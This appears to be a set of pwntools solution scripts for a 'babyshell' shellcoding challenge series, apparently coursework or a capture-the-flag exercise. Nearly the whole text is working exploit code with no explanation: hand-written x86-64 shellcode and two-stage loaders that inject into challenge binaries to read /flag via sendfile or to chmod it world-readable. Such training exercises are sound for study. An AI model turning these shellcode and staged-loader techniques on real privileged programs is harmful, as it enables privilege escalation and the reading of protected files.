











## 3

```python
import pwn
import pwnlib
from pwn import *

shellcode = pwn.asm("""
    push 1
    pop r8
    
    mov r12, 0x67616c662f
    push r12



    /* call open('rsp', 'O_RDONLY') */
    push SYS_open /* 2 */
    pop rax
    push rsp
    pop rdi
    xor esi, esi /* O_RDONLY */
    syscall

    /* Save file descriptor for later */
    push rax
    pop rbx


      /* call fstat('rax', 'rsp') */
    push rax
    pop rdi
    push SYS_fstat /* 5 */
    pop rax
    push rsp
    pop rsi
    syscall
    
    /* Get file size */
   /* add rsp, 48*/
   
   /* call sendfile('r8', 'rbx', 0, 'rdx') */
    mov r10, rdx
    push SYS_sendfile /* 0x28 */
    pop rax
    mov rdi, r8
    push rbx
    pop rsi
    cdq /* rdx=0 */
    syscall """,arch='amd64', os='linux')


print (pwn.disasm(shellcode, arch='amd64', os='linux'))

p=process("/challenge/week5_babyshell_level1")

fp = open('sh_shellcode', 'wb')
fp.write(shellcode)
fp.close()
p.send(shellcode)
p.interactive()
```



## 8

```python
import pwn
from pwn import *


pwn.context.arch = 'amd64'
pwn.context.os = 'linux'


stage1 = pwn.asm(
    """ 
    mov rax,0
    mov rdi,0
    lea rsi, [rip]
    mov rdx, 1000
    syscall

    """)

stage2 =pwn.asm(pwn.shellcraft.readfile('/flag',1))

p = pwn.process('/challenge/week5_babyshell_level8')
p.send(stage1)
p.readuntil("Executing shellcode")
p.send(b'\x90'*16 + stage2)
p.interactive()
```



## 9

```python
import pwn
from pwn import *


pwn.context.arch = 'amd64'
pwn.context.os = 'linux'


asm = (pwn.shellcraft.chmod('a',4))
print(asm)
shellcode = pwn.asm(
"""
    push 0x61
    push rsp
    pop rdi
    push 4
    pop rsi
    push 0x5a
    pop rax
    syscall



"""
        )
      
fp = open('sh_shellcode9','wb')
fp.write(shellcode) 
fp.close()
    

p = pwn.process('/challenge/week5_babyshell_level9')
p.send(shellcode)
p.interactive()
```



## 10

```python
import pwn
from pwn import *


pwn.context.arch = 'amd64'
pwn.context.os = 'linux'


stage1 = pwn.asm(
    """ 
    xor edi,edi
    mov esi,edx
    syscall

    """)

fp = open('sh_shellcode14.1.1','wb')
fp.write(stage1)
fp.close()

stage2 =pwn.asm(pwn.shellcraft.readfile('/flag',1))

p = pwn.process('/challenge/week5_babyshell_level10')
p.send(stage1)
p.readuntil("Executing shellcode")
p.send(b'\x90'*50 + stage2)
p.interactive()

```



## 11

```
import pwn
from pwn import *

  
pwn.context.arch = 'amd64'
pwn.context.os = 'linux'

asm = pwn.shellcraft.chmod('/flag',0o777)
shellcode =pwn.asm("""
    


    mov r12, 0x67616c662f
    push r12

    mov rdi, rsp
    xor esi, esi
    mov si, 0x1ff
    /* call chmod() */
    push 0x5a /* 0x5a */
    pop rax
    syscall


""")

print(asm)
print(shellcode)
print(pwn.disasm(shellcode))

fp = open('sh_shellcode11','wb')
fp.write(shellcode)
fp.close()

p = pwn.process('/challenge/week5_babyshell_level11')
p.send(shellcode)
p.interactive()
```



## 12

```python
import pwn
from pwn import *


pwn.context.arch = 'amd64'
pwn.context.os = 'linux'


asm = (pwn.shellcraft.chmod('a',4))
print(asm)
shellcode = pwn.asm(
"""
    push 0x61
    push rsp
    pop rdi
    push 4
    pop rsi
    push 0x5a
    pop rax
    syscall



"""
        )

fp = open('sh_shellcode12','wb')
fp.write(shellcode)
fp.close()


p = pwn.process('/challenge/week5_babyshell_level12')
p.send(shellcode)
p.interactive()

```



## 14

```python
import pwn
from pwn import *


pwn.context.arch = 'amd64'
pwn.context.os = 'linux'


stage1 = pwn.asm(
    """ 
    xor edi,edi
    mov esi,edx
    syscall

    """)

fp = open('sh_shellcode14.1.1','wb')
fp.write(stage1)
fp.close()

stage2 =pwn.asm(pwn.shellcraft.readfile('/flag',1))

p = pwn.process('/challenge/week5_babyshell_level14')
p.send(stage1)
p.readuntil("Executing shellcode")
p.send(b'\x90'*50 + stage2)
p.interactive()

```

